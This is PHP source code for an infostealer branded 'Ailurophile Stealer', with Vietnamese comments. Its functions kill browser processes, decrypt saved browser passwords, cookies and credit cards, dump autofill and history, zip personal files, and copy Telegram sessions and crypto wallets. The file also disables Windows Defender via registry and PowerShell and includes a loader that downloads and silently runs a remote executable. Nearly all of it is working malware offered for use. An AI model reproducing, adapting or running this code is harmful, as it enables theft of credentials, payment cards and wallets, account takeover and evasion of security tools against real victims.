    $browsersProcess = ["chrome.exe", "filezilla.exe", "msedge.exe", "watcher.exe", "opera.exe", "brave.exe", "steam.exe", "RiotClientServices.exe"];
    $additionalProcesses = ["discord.exe"];
    $localappdata = $_SERVER['LOCALAPPDATA'];

    try {
        $tasks = shell_exec("tasklist");

        foreach ($browsersProcess as $process) {
            if (strpos($tasks, $process) !== false) {
                shell_exec("taskkill /IM $process /F");
            }
        }
        usleep(2500000);
        foreach ($additionalProcesses as $process) {
            if (strpos($tasks, $process) !== false) {
                shell_exec("taskkill /F /T /IM $process");
                shell_exec("\"$localappdata\\" . ucfirst(str_replace('.exe', '', $process)) . "\\Update.exe\" --processStart $process");
            }
        }
    } catch (Exception $e) {
        echo "Error: " . $e->getMessage() . "\n";
    }
}
function get_Autofill($browserPaths, $mainFolderPath) { 
    $userCopyright = "Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"; // Thay đổi nếu cần
    $autofillData = [];

    foreach ($browserPaths as $pathData) {
        $path = $pathData[0];
        $applicationName = strpos($path, 'Local') !== false
            ? explode('\\Local\\', $path)[1]
            : explode('\\Roaming\\', $path)[1];
        $applicationName = explode('\\', $applicationName)[0];

        $webDataPath = $path . 'Web Data';
        $webDataDBPath = $path . 'webdata.db';

        // Kiểm tra xem file có tồn tại không
        if (!file_exists($webDataPath)) {
            continue;
        }

        // Sao chép file
        copy($webDataPath, $webDataDBPath);

        // Mở cơ sở dữ liệu SQLite
        $pdo = new PDO('sqlite:' . $webDataDBPath);
        $query = 'SELECT * FROM autofill';
        $statement = $pdo->query($query);

        while ($row = $statement->fetch(PDO::FETCH_ASSOC)) {
            if ($row) {
                $autofillData[] = "================\nName: " .
                    $row['name'] .
                    "\nValue: " .
                    $row['value'] .
                    "\nApplication: " .
                    $applicationName .
                    ' ' .
                    $pathData[1] .
                    "\n";
            }
        }

        if (empty($autofillData)) {
            $autofillData[] = "No autofills found for " . $applicationName . ' ' . $pathData[1] . "\n";
        }
    }

    if (!empty($autofillData)) {
        $autofillsFolderPath = $mainFolderPath . '\\Autofills';
        $autofillsFilePath = $autofillsFolderPath . '\\Autofills.txt';

        // Kiểm tra và xóa file nếu tồn tại
        if (file_exists($autofillsFilePath)) {
            unlink($autofillsFilePath);
        }

        // Tạo thư mục nếu chưa tồn tại
        if (!file_exists($autofillsFolderPath)) {
            mkdir($autofillsFolderPath, 0777, true);
        }

        // Ghi dữ liệu vào file
        file_put_contents($autofillsFilePath, $userCopyright . implode('', $autofillData), FILE_APPEND | LOCK_EX);
    }
	
	return count($autofillData);
}
function hex2bin_safe($hex) {
    if (!ctype_xdigit($hex)) {
        throw new InvalidArgumentException("Input string must be hexadecimal");
    }
    return hex2bin($hex);
}

function getCookies($browserPaths, $mainFolderPath) {
    $cookiesData = [];
    $cookiesData['banner'] = ["Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"];
    $totalCookies = 0;

    foreach ($browserPaths as $i => $path) {
        $networkPath = $path[0] . 'Network';

        if (!file_exists($networkPath . '/Cookies')) {
            continue;
        }

        $browserFolder = '';
        if (strpos($path[0], 'Local') !== false) {
            $browserFolder = explode('\\Local\\', $path[0])[1];
            $browserFolder = explode('\\', $browserFolder)[0];
        } else {
            $browserFolder = explode('\\Roaming\\', $path[0])[1];
            $browserFolder = explode('\\', $browserFolder)[1];
        }

        $cookiesPath = $networkPath . '/Cookies';
        $db = new SQLite3($cookiesPath);

        $query = 'SELECT * FROM cookies';
        $results = $db->query($query);

        while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
            $encryptedValue = $row['encrypted_value'];
            $iv = substr($encryptedValue, 3, 12);
            $encryptedData = substr($encryptedValue, 15, strlen($encryptedValue) - 31);
            $authTag = substr($encryptedValue, -16);

            $decrypted = '';

            try {
                if (isset($path[3]) && !empty($path[3])) {
                    $cipher = "aes-256-gcm";
                    $key = hex2bin_safe($path[3]);
                    $decrypted = @openssl_decrypt($encryptedData, $cipher, $key, OPENSSL_RAW_DATA, $iv, $authTag);
                } else {
                    echo "Encryption key not found for path: {$path[0]}\n";
                }
            } catch (Exception $e) {
                echo "Error decrypting cookies for {$row['host_key']}: {$e->getMessage()}\n";
            }

            $cookieKey = "{$browserFolder}_{$path[1]}";
            if (!isset($cookiesData[$cookieKey])) {
                $cookiesData[$cookieKey] = [];
            }

            $cookiesData[$cookieKey][] = "{$row['host_key']}	TRUE	/	FALSE	2597573456	{$row['name']}	{$decrypted}\n\n";
            $totalCookies++;
        }

        $db->close();
    }

    foreach ($cookiesData as $browserName => $cookies) {
        if (strtolower($browserName) === 'banner') {
            continue;
        }

        if (!empty($cookies)) {
            $cookiesContent = implode('', $cookies);
            $cookiesWithBanner = "Ailurophile Stealer - Telegram: @Ailurophilevn\n\n" . $cookiesContent;
            $fileName = "{$browserName}.txt";

            $cookiesFolderPath = $mainFolderPath . '/Cookies';
            $cookiesFilePath = $cookiesFolderPath . '/' . $fileName;

            try {
                if (!file_exists($cookiesFolderPath)) {
                    mkdir($cookiesFolderPath, 0777, true);
                }

                if (file_exists($cookiesFilePath)) {
                    unlink($cookiesFilePath);
                }

                file_put_contents($cookiesFilePath, $cookiesWithBanner);

                // Move the cookies file to the main folder
                moveFileToFolder($cookiesFilePath, $mainFolderPath . '/Cookies');
            } catch (Exception $e) {
                echo "Error writing/moving cookies file {$cookiesFilePath}: {$e->getMessage()}\n";
            }
        }
    }

    // Return the total number of cookies found
    return $totalCookies;
}


function moveFileToFolder($filePath, $destinationFolder) {
    $destinationPath = $destinationFolder . '/' . basename($filePath);
    rename($filePath, $destinationPath);
}
function getPasswords($browserPaths, $mainFolderPath) {
    $totalPasswords = 0; // Biến để đếm tổng số mật khẩu

    foreach ($browserPaths as $path) {
        $passwords = [];
        if (!file_exists($path[0])) {
            continue;
        }

        $appName = '';
        if (strpos($path[0], 'Local') !== false) {
            $appName = explode('\\Local\\', $path[0])[1];
            $appName = explode('\\', $appName)[0];
        } else {
            $appName = explode('\\Roaming\\', $path[0])[1];
            $appName = explode('\\', $appName)[1];
        }

        $loginDataPath = $path[0] . 'Login Data';
        $passwordsDbPath = $path[0] . 'passwords.db';

        if (!file_exists($loginDataPath)) {
            continue;
        }

        copy($loginDataPath, $passwordsDbPath);

        $db = new SQLite3($passwordsDbPath);

        $query = 'SELECT origin_url, username_value, password_value, date_created FROM logins';
        $results = $db->query($query);

        while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
            if (!$row['username_value']) {
                continue;
            }

            try {
                $encryptedValue = $row['password_value'];
                $iv = substr($encryptedValue, 3, 12);
                $encryptedData = substr($encryptedValue, 15, strlen($encryptedValue) - 31);
                $authTag = substr($encryptedValue, -16);

                $cipher = "aes-256-gcm";
                $key = hex2bin($path[3]);
                $decrypted = openssl_decrypt($encryptedData, $cipher, $key, OPENSSL_RAW_DATA, $iv, $authTag);

                $dateCreated = date('Y-m-d H:i:s', $row['date_created'] / 1000000 - 11644473600);

                $passwords[] = "================\nURL: " . $row['origin_url'] . "\nUsername: " . $row['username_value'] . "\nPassword: " . $decrypted . "\nDate Created: " . $dateCreated . "\nApplication: " . $appName . " " . $path[1] . "\n";
                $totalPasswords++; // Tăng biến đếm khi tìm thấy mật khẩu
            } catch (Exception $e) {
                // Handle decryption error
            }
        }

        $db->close();

        if (empty($passwords)) {
            $passwords[] = 'No password found';
        }

        if (!empty($passwords)) {
            $passwordsFolderPath = $mainFolderPath . '/Passwords';
            $name_file = $appName . "-" . $path[1] . '.txt';
            if (!file_exists($passwordsFolderPath)) {
                mkdir($passwordsFolderPath, 0777, true);
            }

            $passwordsFilePath = $passwordsFolderPath . '/' . $name_file;

            // Kiểm tra và xóa tệp nếu đã tồn tại
            if (file_exists($passwordsFilePath)) {
                unlink($passwordsFilePath);
            }

            file_put_contents($passwordsFilePath, "Ailurophile Stealer - Telegram: @Ailurophilevn\n \n" . implode('', $passwords), FILE_APPEND);
        }
    }

    // Trả về tổng số mật khẩu tìm được
    return $totalPasswords;
}
function getHistory($browserPaths, $mainFolderPath) {
    $totalHistoryEntries = 0; // Biến để đếm tổng số lịch sử

    foreach ($browserPaths as $path) {
        $historyEntries = [];
        if (!file_exists($path[0])) {
            continue;
        }

        $appName = getFolderNameAfterAppData($path[0]);

        $historyDataPath = $path[0] . 'History';
        $historyDbPath = $path[0] . 'history.db';

        if (!file_exists($historyDataPath)) {
            continue;
        }

        copy($historyDataPath, $historyDbPath);

        $db = new SQLite3($historyDbPath);

        $query = 'SELECT url, title, visit_count, last_visit_time FROM urls';
        $results = $db->query($query);

        while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
            if (!$row['url']) {
                continue;
            }

            $lastVisitTime = ($row['last_visit_time'] / 1000000) - 11644473600;
            $dateVisited = date('Y-m-d H:i:s', (int)$lastVisitTime);

            $historyEntries[] = "================\nURL: " . $row['url'] . "\nTitle: " . $row['title'] . "\nVisit Count: " . $row['visit_count'] . "\nLast Visit Time: " . $dateVisited . "\nApplication: " . $appName . " " . $path[1] . "\n";
            $totalHistoryEntries++; // Tăng biến đếm khi tìm thấy lịch sử
        }

        $db->close();

        if (empty($historyEntries)) {
            $historyEntries[] = 'No history found';
        }

        if (!empty($historyEntries)) {
            $historyFolderPath = $mainFolderPath . '/History';
            $name_file = getFolderNameAfterAppData($path[0]) . "-" . $path[1] . '.txt';
            if (!file_exists($historyFolderPath)) {
                mkdir($historyFolderPath, 0777, true);
            }

            $historyFilePath = $historyFolderPath . '/' . $name_file;
            
            // Kiểm tra và xóa tệp nếu đã tồn tại
            if (file_exists($historyFilePath)) {
                unlink($historyFilePath);
            }

            // Ghi đè nội dung của tệp tin
            file_put_contents($historyFilePath, "Ailurophile Stealer - Telegram: @Ailurophilevn\n\n" . implode('', $historyEntries));
        }
    }

    // Trả về tổng số lịch sử tìm được
    return $totalHistoryEntries;
}
function stealFiles($allowedExtensions, $foldersToSearch, $files, $mainFolderPath) {
    $totalFilesStolen = 0; // Biến để đếm tổng số tệp tin

    try {
        // Tạo đối tượng ZipArchive
        $zip = new ZipArchive();
        $zipFilePath = $_SERVER['LOCALAPPDATA'] . DIRECTORY_SEPARATOR . "Ailurophile" . DIRECTORY_SEPARATOR . 'stolen_files.zip';

        // Tạo thư mục nếu chưa tồn tại
        if (!file_exists(dirname($zipFilePath))) {
            mkdir(dirname($zipFilePath), 0777, true);
        }

        if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
            throw new Exception('Cannot create a zip file.');
        }

        foreach ($foldersToSearch as $folder) {
            $directory = getenv('USERPROFILE') . DIRECTORY_SEPARATOR . $folder;

            if (file_exists($directory) && is_dir($directory)) {
                $filesInFolder = scandir($directory);

                foreach ($filesInFolder as $file) {
                    $filePath = $directory . DIRECTORY_SEPARATOR . $file;
                    $fileExtension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
                    $fileName = strtolower(pathinfo($filePath, PATHINFO_FILENAME));
                    $fileSize = filesize($filePath);

                    if (is_file($filePath) &&
                        in_array($fileExtension, $allowedExtensions) &&
                        count(array_filter($files, function($keyword) use ($fileName) {
                            return strpos($fileName, $keyword) !== false;
                        })) > 0 &&
                        $fileSize < 3 * 1024 * 1024) {
                        $zip->addFile($filePath, basename($filePath));
                        $totalFilesStolen++; // Tăng biến đếm khi tìm thấy tệp tin phù hợp
                    }
                }
            }
        }

        $zip->close();

        // echo 'Files stolen and compressed successfully. ZIP file path: ' . $zipFilePath;
    } catch (Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }

    // Trả về tổng số tệp tin tìm được
    return $totalFilesStolen;
}
function getCards($browserPaths, $mainFolderPath) {
    $cards = [];
    $totalCardsFound = 0; // Biến để đếm tổng số thẻ

    foreach ($browserPaths as $path) {
        if (!file_exists($path[0])) {
            continue;
        }

        $appName = '';
        if (strpos($path[0], 'Local') !== false) {
            $appName = explode('\\Local\\', $path[0])[1];
            $appName = explode('\\', $appName)[0];
        } else {
            $appName = explode('\\Roaming\\', $path[0])[1];
            $appName = explode('\\', $appName)[1];
        }

        $webDataPath = $path[0] . 'Web Data';
        $copiedFilePath = $path[0] . 'Web.db';
        $key = hex2bin($path[3]);

        if (!file_exists($webDataPath)) {
            continue;
        }

        copy($webDataPath, $copiedFilePath);

        $db = new SQLite3($copiedFilePath);

        $query = 'SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards';
        $results = $db->query($query);

        while ($card = $results->fetchArray(SQLITE3_ASSOC)) {
            try {
                $month = $card['expiration_month'] < 10 ? '0' . $card['expiration_month'] : $card['expiration_month'];
                $iv = substr($card['card_number_encrypted'], 3, 12);
                $encryptedData = substr($card['card_number_encrypted'], 15, strlen($card['card_number_encrypted']) - 31);
                $authTag = substr($card['card_number_encrypted'], -16);

                $cipher = "aes-256-gcm";
                $decryptedCardNumber = openssl_decrypt($encryptedData, $cipher, $key, OPENSSL_RAW_DATA, $iv, $authTag);

                $cardInfo = $decryptedCardNumber . "\t" . $month . "/" . $card['expiration_year'] . "\t" . $card['name_on_card'] . "\n";
                $cards[] = $cardInfo;
                $totalCardsFound++; // Tăng biến đếm khi tìm thấy thẻ
            } catch (Exception $e) {
                // Handle decryption error
            }
        }

        $db->close();

        try {
            unlink($copiedFilePath);
        } catch (Exception $e) {
            // Handle unlink error
        }
    }

    if (empty($cards)) {
        $cards[] = 'no cards found';
    }

    if (!empty($cards)) {
        $cardsFolderPath = $mainFolderPath . DIRECTORY_SEPARATOR . 'Cards';
        if (!file_exists($cardsFolderPath)) {
            mkdir($cardsFolderPath, 0777, true);
        }

        $cardsFilePath = $cardsFolderPath . DIRECTORY_SEPARATOR . 'Cards.txt';

        // Kiểm tra và xóa tệp nếu đã tồn tại
        if (file_exists($cardsFilePath)) {
            unlink($cardsFilePath);
        }

        file_put_contents($cardsFilePath, "Ailurophile Stealer - Telegram: @Ailurophilevn\n\n" . implode('', $cards), FILE_APPEND);
    }

    // Trả về tổng số thẻ tìm được
    return $totalCardsFound;
}
function submitTelegram($mainpath) {
    try {
        $sourcePath = getenv('APPDATA') . '\\Telegram Desktop\\tdata';

        // Kiểm tra quyền truy cập vào đường dẫn nguồn
        if (!is_dir($sourcePath) && !is_file($sourcePath)) {
           // echo "Error accessing source path: Không thể truy cập đường dẫn nguồn.\n";
            return;
        }

        $destinationPath = $mainpath."\Telegram";

        // Kiểm tra và tạo thư mục đích nếu chưa tồn tại
        if (!file_exists($destinationPath)) {
            if (!mkdir($destinationPath, 0777, true)) {
                //echo "Error: Không thể tạo thư mục đích.\n";
                return;
            }
        }

        // Dừng tiến trình Telegram
       exec("taskkill /IM Telegram.exe /F >nul 2>&1");

        $blacklistFolders = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];

        $files = scandir($sourcePath);

        foreach ($files as $file) {
            if ($file === '.' || $file === '..') {
                continue;
            }

            if (!in_array($file, $blacklistFolders)) {
                $sourceItemPath = $sourcePath . DIRECTORY_SEPARATOR . $file;
                $targetItemPath = $destinationPath . DIRECTORY_SEPARATOR . $file;

                try {
                    if (is_dir($sourceItemPath)) {
                        if (!mkdir($targetItemPath, 0777, true)) {
                        //    echo "Error: Không thể tạo thư mục $targetItemPath.\n";
                            continue;
                        }
                        copyFolderContents($sourceItemPath, $targetItemPath);
                    } else {
                        if (!copy($sourceItemPath, $targetItemPath)) {
                         //   echo "Error: Không thể sao chép tệp $sourceItemPath đến $targetItemPath.\n";
                        }
                    }
                } catch (Exception $e) {
                //    echo "An error occurred: " . $e->getMessage() . "\n";
                }
            }
        }

        //echo "Telegram session data copied to $mainpath\n";
    } catch (Exception $e) {
        //echo "Error in submitTelegram: " . $e->getMessage() . "\n";
    }
}

function copyFolderContents($source, $target) {
    $files = scandir($source);

    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }

        $sourceFilePath = $source . DIRECTORY_SEPARATOR . $file;
        $targetFilePath = $target . DIRECTORY_SEPARATOR . $file;

        if (is_dir($sourceFilePath)) {
            if (!mkdir($targetFilePath, 0777, true)) {
                //echo "Error: Không thể tạo thư mục $targetFilePath.\n";
                continue;
            }
            copyFolderContents($sourceFilePath, $targetFilePath);
        } else {
            if (!copy($sourceFilePath, $targetFilePath)) {
               // echo "Error: Không thể sao chép tệp $sourceFilePath đến $targetFilePath.\n";
            }
        }
    }
}
function localWalletData($mainFolderPath, $_0x4ae424) {
    $copied = false; // Biến cờ để theo dõi trạng thái sao chép

    try {
        // Tạo đường dẫn đến thư mục 'Wallets' trong thư mục chính
        $walletsDestination = $mainFolderPath . DIRECTORY_SEPARATOR . 'Wallets';
        
        // Kiểm tra và tạo thư mục 'Wallets' nếu chưa tồn tại
        if (!file_exists($walletsDestination)) {
            mkdir($walletsDestination, 0777, true);
        }

        // Sao chép dữ liệu cho từng ví trong mảng $_0x4ae424
        foreach ($_0x4ae424 as $walletName => $walletSourcePath) {
            $walletSource = getenv('APPDATA') . $walletSourcePath;
            $walletDestination = $walletsDestination . DIRECTORY_SEPARATOR . $walletName;

            // Kiểm tra nếu nguồn tồn tại
            if (file_exists($walletSource)) {
                // Kiểm tra và tạo thư mục đích nếu chưa tồn tại
                if (!file_exists($walletDestination)) {
                    mkdir($walletDestination, 0777, true);
                }

                // Sao chép nội dung của thư mục ví đến thư mục Wallets con
                copyFolder($walletSource, $walletDestination);
                $copied = true; // Đặt cờ thành true nếu có gì đó được sao chép
            }
        }

    } catch (Exception $e) {
       // echo "Error copying wallet data: " . $e->getMessage() . "\n";
    }

    return $copied ? 1 : 0; // Trả về 1 nếu có dữ liệu được sao chép, ngược lại trả về 0
}

function copyFolder($source, $destination) {
    $dir = opendir($source);
    @mkdir($destination);

    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            if (is_dir($source . DIRECTORY_SEPARATOR . $file)) {
                copyFolder($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            } else {
                copy($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            }
        }
    }

    closedir($dir);
}

function disable_wd(){
	
	 if (!isAdmin()) {
        return;
    }

    regEdit2("HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
    regEdit2("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
    regEdit2("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
    regEdit2("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
    regEdit2("HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

    $args2 = "Get-MpPreference -verbose";
    $output = runPS($args2);

    if ($output === null) {
        echo "Không mở được Windows Defender preferences.";
        return;
    }

    $settings = [
        "DisableRealtimeMonitoring",
        "DisableBehaviorMonitoring",
        "DisableBlockAtFirstSeen",
        "DisableIOAVProtection",
        "DisablePrivacyMode",
        "SignatureDisableUpdateOnStartupWithoutEngine",
        "DisableArchiveScanning",
        "DisableIntrusionPreventionSystem",
        "DisableScriptScanning",
        "SubmitSamplesConsent",
        "MAPSReporting",
        "HighThreatDefaultAction",
        "ModerateThreatDefaultAction",
        "LowThreatDefaultAction",
        "SevereThreatDefaultAction"
    ];

    $commands = [
        "DisableRealtimeMonitoring" => "Set-MpPreference -DisableRealtimeMonitoring \$true",
        "DisableBehaviorMonitoring" => "Set-MpPreference -DisableBehaviorMonitoring \$true",
        "DisableBlockAtFirstSeen" => "Set-MpPreference -DisableBlockAtFirstSeen \$true",
        "DisableIOAVProtection" => "Set-MpPreference -DisableIOAVProtection \$true",
        "DisablePrivacyMode" => "Set-MpPreference -DisablePrivacyMode \$true",
        "SignatureDisableUpdateOnStartupWithoutEngine" => "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine \$true",
        "DisableArchiveScanning" => "Set-MpPreference -DisableArchiveScanning \$true",
        "DisableIntrusionPreventionSystem" => "Set-MpPreference -DisableIntrusionPreventionSystem \$true",
        "DisableScriptScanning" => "Set-MpPreference -DisableScriptScanning \$true",
        "SubmitSamplesConsent" => "Set-MpPreference -SubmitSamplesConsent 2",
        "MAPSReporting" => "Set-MpPreference -MAPSReporting 0",
        "HighThreatDefaultAction" => "Set-MpPreference -HighThreatDefaultAction 6 -Force",
        "ModerateThreatDefaultAction" => "Set-MpPreference -ModerateThreatDefaultAction 6",
        "LowThreatDefaultAction" => "Set-MpPreference -LowThreatDefaultAction 6",
        "SevereThreatDefaultAction" => "Set-MpPreference -SevereThreatDefaultAction 6"
    ];

    foreach ($settings as $setting) {
        if (strpos($output, $setting) !== false && strpos($output, "False") !== false) {
            runPS($commands[$setting]);
        }
    }
	
}


function isAdmin() {
    $output = null;
    $result = null;
    exec('net session', $output, $result);
    return $result === 0;
}

//use power shell
function regEdit($regPath, $name, $value) {
    try {
        $command = "powershell -Command \"Start-Process 'powershell' -ArgumentList 'reg add \\\"$regPath\\\" /v $name /t REG_DWORD /d $value /f' -Verb RunAs\"";
        shell_exec($command);
    } catch (Exception $e) {
        // Handle exception if needed
    }
}

//use cmd
function regEdit2($regPath, $name, $value) {
    try {
        $command = "reg add \"$regPath\" /v $name /t REG_DWORD /d $value /f";
        shell_exec($command);
    } catch (Exception $e) {
        // Handle exception if needed
    }
}

function runPS($args) {
    try {
        $command = "powershell -Command \"$args\"";
        $output = shell_exec($command);
        return $output;
    } catch (Exception $e) {
        return null;
    }
}

function stub_loader($url) {
    try {
        $localAppData = $_SERVER['LOCALAPPDATA'];
        $fileName = $localAppData . DIRECTORY_SEPARATOR . "update.exe";

        $fileData = file_get_contents($url);
        if ($fileData === false) {
            throw new Exception("Error downloading file");
        }

        file_put_contents($fileName, $fileData);

        // Chạy tệp thực thi trong nền
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            // Dành cho Windows
            pclose(popen("start /B " . $fileName, "r"));
        } else {
            // Dành cho các hệ điều hành khác (Linux, macOS, etc.)
            shell_exec("nohup " . $fileName . " > /dev/null 2>&1 &");
        }

        return true;
    } catch (Exception $e) {
        return false;
    }
}
?>